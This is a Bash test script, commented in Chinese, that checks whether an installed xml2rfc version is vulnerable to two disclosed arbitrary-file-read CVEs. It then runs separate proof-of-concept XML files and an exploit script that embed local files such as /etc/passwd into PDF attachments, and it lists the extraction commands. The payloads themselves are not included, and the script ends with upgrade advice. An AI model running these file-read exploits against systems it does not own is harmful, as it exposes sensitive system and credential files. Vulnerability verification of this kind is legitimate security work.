#!/bin/bash
#
# xml2rfc 漏洞POC测试脚本
# 用于验证CVE-2025-11058和CVE-2025-11059
#

set -e

echo "=========================================="
echo "xml2rfc 任意文件读取漏洞 POC 测试脚本"
echo "=========================================="
echo ""

# 颜色定义
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# 检查必要的命令
check_command() {
    if ! command -v "$1" &> /dev/null; then
        echo -e "${RED}[!] 错误: $1 未安装${NC}"
        echo -e "${YELLOW}[*] 安装命令: $2${NC}"
        return 1
    else
        echo -e "${GREEN}[+] $1 已安装${NC}"
        return 0
    fi
}

echo "检查依赖..."
ALL_DEPS=true

if ! check_command "python3" "apt-get install python3 (Ubuntu/Debian)"; then
    ALL_DEPS=false
fi

if ! check_command "xml2rfc" "pip install xml2rfc"; then
    ALL_DEPS=false
fi

if ! check_command "pdfdetach" "apt-get install poppler-utils (Ubuntu/Debian)"; then
    echo -e "${YELLOW}[!] 警告: pdfdetach未安装，将无法提取PDF附件${NC}"
fi

if [ "$ALL_DEPS" = false ]; then
    echo -e "${RED}[!] 请先安装缺失的依赖${NC}"
    exit 1
fi

echo ""
echo "=========================================="
echo "检查xml2rfc版本"
echo "=========================================="

XML2RFC_VERSION=$(xml2rfc --version 2>&1 | grep -oP '\d+\.\d+\.\d+' | head -1)
echo -e "${GREEN}[*] 检测到版本: $XML2RFC_VERSION${NC}"

# 解析版本号
IFS='.' read -r MAJOR MINOR PATCH <<< "$XML2RFC_VERSION"

VULNERABLE=false
if [ "$MAJOR" -lt 3 ]; then
    VULNERABLE=true
elif [ "$MAJOR" -eq 3 ] && [ "$MINOR" -lt 30 ]; then
    VULNERABLE=true
elif [ "$MAJOR" -eq 3 ] && [ "$MINOR" -eq 30 ] && [ "$PATCH" -lt 2 ]; then
    VULNERABLE=true
fi

if [ "$VULNERABLE" = true ]; then
    echo -e "${RED}[!] 该版本存在漏洞!${NC}"
    if [ "$PATCH" -lt 1 ]; then
        echo -e "${RED}[!] 存在 CVE-2025-11058 (GHSA-cfmv-h8fx-85m7)${NC}"
    fi
    if [ "$PATCH" -lt 2 ]; then
        echo -e "${RED}[!] 存在 CVE-2025-11059 (GHSA-9mv7-3c64-mmqw)${NC}"
    fi
else
    echo -e "${GREEN}[+] 该版本已修复漏洞${NC}"
    echo -e "${YELLOW}[*] POC测试可能失败（这是预期行为）${NC}"
    read -p "是否继续测试? (y/N): " -n 1 -r
    echo
    if [[ ! $REPLY =~ ^[Yy]$ ]]; then
        exit 0
    fi
fi

echo ""
echo "=========================================="
echo "测试1: 读取 /etc/passwd"
echo "=========================================="

if [ ! -f "poc_read_passwd.xml" ]; then
    echo -e "${RED}[!] 错误: poc_read_passwd.xml 不存在${NC}"
    exit 1
fi

echo "[*] 执行: xml2rfc --pdf poc_read_passwd.xml -o test_passwd.pdf"
if xml2rfc --pdf poc_read_passwd.xml -o test_passwd.pdf 2>&1 | tee test1.log; then
    if [ -f "test_passwd.pdf" ]; then
        FILE_SIZE=$(stat -f%z "test_passwd.pdf" 2>/dev/null || stat -c%s "test_passwd.pdf" 2>/dev/null)
        echo -e "${GREEN}[+] PDF生成成功: test_passwd.pdf (${FILE_SIZE} bytes)${NC}"
        
        # 检查是否有警告信息
        if grep -q "Removed.*link relationships type attachment is not allowed" test1.log; then
            echo -e "${GREEN}[+] 检测到安全修复: link标签被移除${NC}"
        elif [ "$VULNERABLE" = true ]; then
            echo -e "${RED}[!] 未检测到安全修复，漏洞可能被成功利用${NC}"
        fi
        
        # 尝试列出附件
        if command -v pdfdetach &> /dev/null; then
            echo "[*] 检查PDF附件..."
            if pdfdetach -list test_passwd.pdf 2>&1 | tee -a test1.log; then
                if grep -q "attachment" test1.log; then
                    echo -e "${RED}[!] 发现附件! 漏洞利用成功${NC}"
                else
                    echo -e "${GREEN}[+] 未发现附件${NC}"
                fi
            fi
        fi
    else
        echo -e "${RED}[-] PDF生成失败${NC}"
    fi
else
    echo -e "${RED}[-] xml2rfc执行失败${NC}"
fi

echo ""
echo "=========================================="
echo "测试2: 读取多个文件"
echo "=========================================="

if [ ! -f "poc_multiple_files.xml" ]; then
    echo -e "${RED}[!] 错误: poc_multiple_files.xml 不存在${NC}"
else
    echo "[*] 执行: xml2rfc --pdf poc_multiple_files.xml -o test_multiple.pdf"
    if xml2rfc --pdf poc_multiple_files.xml -o test_multiple.pdf 2>&1 | tee test2.log; then
        if [ -f "test_multiple.pdf" ]; then
            FILE_SIZE=$(stat -f%z "test_multiple.pdf" 2>/dev/null || stat -c%s "test_multiple.pdf" 2>/dev/null)
            echo -e "${GREEN}[+] PDF生成成功: test_multiple.pdf (${FILE_SIZE} bytes)${NC}"
            
            if grep -q "Removed.*link relationships type attachment is not allowed" test2.log; then
                echo -e "${GREEN}[+] 检测到安全修复: link标签被移除${NC}"
            fi
        else
            echo -e "${RED}[-] PDF生成失败${NC}"
        fi
    fi
fi

echo ""
echo "=========================================="
echo "测试3: 路径遍历"
echo "=========================================="

if [ ! -f "poc_path_traversal.xml" ]; then
    echo -e "${RED}[!] 错误: poc_path_traversal.xml 不存在${NC}"
else
    echo "[*] 执行: xml2rfc --pdf poc_path_traversal.xml -o test_traversal.pdf"
    if xml2rfc --pdf poc_path_traversal.xml -o test_traversal.pdf 2>&1 | tee test3.log; then
        if [ -f "test_traversal.pdf" ]; then
            FILE_SIZE=$(stat -f%z "test_traversal.pdf" 2>/dev/null || stat -c%s "test_traversal.pdf" 2>/dev/null)
            echo -e "${GREEN}[+] PDF生成成功: test_traversal.pdf (${FILE_SIZE} bytes)${NC}"
            
            if grep -q "Removed.*link relationships type attachment is not allowed" test3.log; then
                echo -e "${GREEN}[+] 检测到安全修复: link标签被移除${NC}"
            fi
        else
            echo -e "${RED}[-] PDF生成失败${NC}"
        fi
    fi
fi

echo ""
echo "=========================================="
echo "测试4: Python自动化脚本"
echo "=========================================="

if [ ! -f "poc_exploit.py" ]; then
    echo -e "${RED}[!] 错误: poc_exploit.py 不存在${NC}"
else
    echo "[*] 执行: python3 poc_exploit.py --file /etc/passwd --output test_python.pdf"
    if python3 poc_exploit.py --file /etc/passwd --output test_python.pdf 2>&1 | tee test4.log; then
        if [ -f "test_python.pdf" ]; then
            echo -e "${GREEN}[+] Python脚本测试成功${NC}"
        else
            echo -e "${YELLOW}[*] Python脚本执行完成但未生成PDF${NC}"
        fi
    fi
fi

echo ""
echo "=========================================="
echo "测试结果汇总"
echo "=========================================="

echo ""
echo "生成的文件:"
ls -lh test_*.pdf 2>/dev/null || echo "无PDF文件生成"

echo ""
echo "日志文件:"
ls -lh test*.log 2>/dev/null || echo "无日志文件"

echo ""
if [ "$VULNERABLE" = true ]; then
    echo -e "${RED}================================${NC}"
    echo -e "${RED}    系统存在安全漏洞!${NC}"
    echo -e "${RED}================================${NC}"
    echo ""
    echo -e "${YELLOW}建议立即升级到 xml2rfc >= 3.30.2${NC}"
    echo -e "${YELLOW}升级命令: pip install --upgrade xml2rfc${NC}"
else
    echo -e "${GREEN}================================${NC}"
    echo -e "${GREEN}    系统已修复漏洞${NC}"
    echo -e "${GREEN}================================${NC}"
fi

echo ""
echo "提取PDF附件的命令:"
echo "  pdfdetach -list <pdf_file>"
echo "  pdfdetach -saveall <pdf_file> -o extracted/"
echo ""
echo "清理测试文件:"
echo "  rm -f test_*.pdf test*.log"
echo ""
echo "详细分析请查看: poc_analysis.md"
echo ""
